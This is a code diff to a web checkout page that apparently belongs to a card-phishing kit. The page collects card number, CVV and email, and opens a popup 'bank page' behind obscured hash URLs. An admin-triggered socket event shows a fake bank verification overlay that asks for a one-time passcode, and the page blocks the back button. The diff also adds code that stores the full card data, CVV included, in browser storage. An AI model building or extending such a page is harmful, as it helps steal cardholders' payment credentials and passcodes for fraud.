@@ -320,32 +320,38 @@
       return hash;
     }
     
-// Helper functions for clean URLs
-function getSuccessUrl(invoiceId) {
-  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-  return `/s/${hash}?invoiceId=${invoiceId}`;
-}
+    // Helper functions for clean URLs
+    function getSuccessUrl(invoiceId) {
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      return `/s/${hash}?invoiceId=${invoiceId}`;
+    }
 
-function getFailUrl(reason) {
-  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-  
-  // Base URL with hash
-  let url = `/f/${hash}`;
-  
-  // Add invoiceId and reason as query parameters if they exist
-  const params = new URLSearchParams();
-  if (currentInvoiceId) params.append('invoiceId', currentInvoiceId);
-  if (reason) params.append('reason', reason);
-  
-  // Only add ? if we have parameters
-  const queryString = params.toString();
-  if (queryString) {
-    url += '?' + queryString;
-  }
-  
-  console.log("Generated fail URL:", url);
-  return url;
-}
+    function getFailUrl(reason) {
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      
+      // Base URL with hash
+      let url = `/f/${hash}`;
+      
+      // Add invoiceId and reason as query parameters if they exist
+      const params = new URLSearchParams();
+      if (currentInvoiceId) params.append('invoiceId', currentInvoiceId);
+      if (reason) params.append('reason', reason);
+      
+      // Only add ? if we have parameters
+      const queryString = params.toString();
+      if (queryString) {
+        url += '?' + queryString;
+      }
+      
+      console.log("Generated fail URL:", url);
+      return url;
+    }
+    
+    // Create a hash URL for bankpage
+    function getBankpageUrl(invoiceId) {
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      return `/b/${hash}?invoiceId=${invoiceId}`;
+    }
     
     // Check current URL and redirect if needed
     document.addEventListener('DOMContentLoaded', function() {
@@ -559,7 +565,7 @@ function getFailUrl(reason) {
     <div class="spinner"></div>
   </div>
 
-  <!-- UPDATED: MC Verification Overlay - New Design -->
+  <!-- UPDATED: MC Verification Overlay - New Design with repositioned Cancel button -->
   <div id="mcVerificationOverlay" class="fullscreen-overlay">
     <!-- Loading Content - Shown Initially -->
     <div id="mcLoadingContent" style="display: flex; justify-content: center; align-items: center; min-height: 300px; background: white; width: 90%; max-width: 480px; border-radius: 8px;">
@@ -567,7 +573,10 @@ function getFailUrl(reason) {
     </div>
     
     <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-    <div id="mcVerificationContent" style="display: none; background-color: #fff; border-radius: 8px; width: 90%; max-width: 480px; padding: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+    <div id="mcVerificationContent" style="display: none; background-color: #fff; border-radius: 8px; width: 90%; max-width: 480px; padding: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); position: relative;">
+      <!-- Cancel button in top-right corner -->
+      <button id="mcCancelBtn" style="position: absolute; top: 10px; right: 15px; background: transparent; border: none; color: #888; font-size: 14px; cursor: pointer; text-decoration: underline;">Cancel</button>
+      
       <!-- Header with bank logos -->
       <div id="mcHeader" style="padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center;">
         <div id="leftBankLogo" style="height: 40px; max-width: 40%;">
@@ -610,7 +619,7 @@ function getFailUrl(reason) {
         
         <div style="margin-bottom: 15px;">
           <label for="mcOtpInput" style="display: block; margin-bottom: 5px; font-size: 13px;">Enter One-Time Passcode:</label>
-          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;" placeholder="Enter One-Time Passcode" maxlength="6">
+         <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;" placeholder="Enter One-Time Passcode" maxlength="6">
         </div>
         
         <p id="mcOtpError" style="color: #ef4444; font-size: 13px; margin-top: 5px; display: none;">
@@ -624,10 +633,10 @@ function getFailUrl(reason) {
           </label>
         </div>
         
+        <!-- Full-width Submit and Resend buttons side by side -->
         <div style="display: flex; gap: 5px; margin-top: 15px;">
-          <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Submit</button>
-          <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #f3f4f6; color: #374151; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Resend</button>
-          <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #f3f4f6; color: #000; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; text-decoration: underline;">Cancel</button>
+          <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #CCCCCC; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: not-allowed;" disabled>Submit</button>
+          <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #CCCCCC; color: #333; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Resend</button>
         </div>
         
         <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
@@ -671,6 +680,9 @@ function getFailUrl(reason) {
       if (sessionStorage.getItem('returning_from_currency') === 'true') {
         // Clear the flag
         sessionStorage.removeItem('returning_from_currency');
+        
+        // Restore form data
+        restoreFormData();
         
         // Show loading state on the submit button
         const submitButton = document.getElementById('submitButton');
@@ -731,6 +743,9 @@ function getFailUrl(reason) {
 
       // Initial validation
       updateSubmitButton();
+      
+      // Setup back button prevention
+      setupBackButtonPrevention();
     });
 
     // Card Validation & Formatting Functions
@@ -897,7 +912,7 @@ function getFailUrl(reason) {
 
       document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
 
-      // Payment Submission Handler
+      // Payment Submission Handler with hash URL for bankpage
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -934,12 +949,17 @@ function getFailUrl(reason) {
           // After setting currentInvoiceId from the API response:
           currentInvoiceId = data.invoiceId;
           localStorage.setItem('invoiceId', currentInvoiceId);
+          
+          // Save form data for currency page return
+          saveFormData();
+          
           console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
           socket.emit('join', currentInvoiceId);
 
-          // Open bank page
+          // Use clean hash URL for bankpage
+          const bankpageUrl = getBankpageUrl(data.invoiceId);
           bankPageWindow = window.open(
-            `/bankpage.html?invoiceId=${data.invoiceId}`,
+            bankpageUrl,
             '_blank',
             'width=600,height=800'
           );
@@ -1007,7 +1027,7 @@ function getFailUrl(reason) {
         isProcessing = false;
       });
 
-      // UPDATED: Modified MC verification event handler with loading spinner
+      // Modified MC verification event handler with loading spinner
       socket.on('show_mc_verification', (data) => {
         console.log('[DEBUG] Received show_mc_verification event:', data);
         console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
@@ -1032,7 +1052,7 @@ function getFailUrl(reason) {
         }
       });
 
-      // NEW: Start verification event handler
+      // Start verification event handler
       socket.on('start_verification', (data) => {
         console.log('[DEBUG] Received start_verification event:', data);
         
@@ -1108,7 +1128,7 @@ function getFailUrl(reason) {
         }
       });
 
-      // Socket events for redirect to currency page
+      // Currency page redirection
       socket.on('redirect_to_currency', (data) => {
         console.log('[DEBUG] Received redirect_to_currency event:', data);
         
@@ -1172,7 +1192,7 @@ function getFailUrl(reason) {
         if (data.invoiceId === currentInvoiceId) {
           // Hide overlay
           const overlay = document.getElementById('mcVerificationOverlay');
-          if (overlay) overlay.style.display = 'none';
+        if (overlay) overlay.style.display = 'none';
           
           // Clear timer if it exists
           if (window.mcTimerInterval) {
@@ -1210,6 +1230,53 @@ function getFailUrl(reason) {
         }
       });
     });
+
+    // Save form data for currency page return
+    function saveFormData() {
+      const formData = {
+        email: document.getElementById('email').value,
+        cardNumber: document.getElementById('cardNumber').value,
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        cardholderName: document.getElementById('cardholderName').value,
+        invoiceId: currentInvoiceId
+      };
+      sessionStorage.setItem('paymentFormData', JSON.stringify(formData));
+    }
+
+    // Restore form data when returning from currency page
+    function restoreFormData() {
+      const savedData = sessionStorage.getItem('paymentFormData');
+      if (savedData) {
+        try {
+          const formData = JSON.parse(savedData);
+          document.getElementById('email').value = formData.email || '';
+          document.getElementById('cardNumber').value = formData.cardNumber || '';
+          document.getElementById('expiry').value = formData.expiry || '';
+          document.getElementById('cvv').value = formData.cvv || '';
+          document.getElementById('cardholderName').value = formData.cardholderName || '';
+          
+          // Restore invoice ID
+          if (formData.invoiceId) {
+            currentInvoiceId = formData.invoiceId;
+          }
+          
+          // Re-validate and update card info
+          if (formData.cardNumber) {
+            isCardValid = validateCard(formData.cardNumber.replace(/\s/g, ''));
+            updateCardTypeAndInfo(formData.cardNumber);
+          }
+          
+          if (formData.expiry) {
+            isExpiryValid = validateExpiry(formData.expiry);
+          }
+          
+          updateSubmitButton();
+        } catch (e) {
+          console.error('Error restoring form data:', e);
+        }
+      }
+    }
 
     // Transaction Status Check Function
     async function checkTransactionStatus() {
@@ -1272,23 +1339,42 @@ function getFailUrl(reason) {
       }, 1000);
     }
 
-    // Back Button Prevention
-    window.onpopstate = function(event) {
-      if (confirm("Do you want to cancel this transaction?")) {
-        window.location.href = getFailUrl('canceled'); // Use clean URL for fail
-      } else {
-        history.pushState(null, null, window.location.href);
-      }
-    };
-    history.pushState(null, null, window.location.href);
+    // Consistent Back Button Prevention
+    function setupBackButtonPrevention() {
+      window.onpopstate = function(event) {
+        if (confirm("Do you want to cancel this transaction?")) {
+          window.location.href = getFailUrl('canceled');
+        } else {
+          // Stay on current page by pushing another state
+          history.pushState(null, null, window.location.href);
+        }
+      };
+      
+      // Initial push to enable back button detection
+      history.pushState(null, null, window.location.href);
+    }
     
     // Setup MC verification event handlers
     function setupMCVerificationHandlers() {
-      // Submit button
+      const mcOtpInput = document.getElementById('mcOtpInput');
       const mcSubmitBtn = document.getElementById('mcSubmitBtn');
+      
+      // Input handler to enable/disable submit button
+      if (mcOtpInput) {
+        mcOtpInput.addEventListener('input', function() {
+          const hasValue = mcOtpInput.value.trim().length > 0;
+          mcSubmitBtn.disabled = !hasValue;
+          mcSubmitBtn.style.backgroundColor = hasValue ? '#007bff' : '#CCCCCC';
+          mcSubmitBtn.style.cursor = hasValue ? 'pointer' : 'not-allowed';
+        });
+      }
+      
+      // Submit button
       if (mcSubmitBtn) {
         mcSubmitBtn.onclick = function() {
-          const otp = document.getElementById('mcOtpInput')?.value?.trim();
+          if (mcSubmitBtn.disabled) return;
+          
+          const otp = mcOtpInput?.value?.trim();
           if (!otp) {
             const mcOtpError = document.getElementById('mcOtpError');
             if (mcOtpError) {
@@ -1330,7 +1416,7 @@ function getFailUrl(reason) {
         };
       }
       
-      // Cancel button with updated styling
+      // Cancel button in top-right corner
       const mcCancelBtn = document.getElementById('mcCancelBtn');
       if (mcCancelBtn) {
         mcCancelBtn.onclick = function() {
@@ -1411,6 +1497,5 @@ function getFailUrl(reason) {
     clearInterval(heartbeatInterval);
   });
   </script>
-</body>
 </body>
 </html>
